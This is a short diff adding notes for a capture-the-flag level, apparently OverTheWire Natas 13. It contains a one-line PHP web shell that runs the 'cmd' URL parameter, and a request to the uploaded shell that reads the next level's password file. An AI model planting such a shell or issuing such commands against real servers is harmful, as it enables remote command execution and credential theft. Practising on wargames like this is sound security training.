@@ -1,0 +1,8 @@
+# Kali Linux (imagem)
+find / -type f -name "*.jpg" -size 1000c
+
+# BurpSuite
+Codigo PHP: <?php echo "\n\n"; passthru($_GET['cmd']); ?>
+
+# BurpSuite
+http://natas13.natas.labs.overthewire.org/upload/sz4y4rbixx.php?cmd=cat%20/etc/natas_webpass/natas14
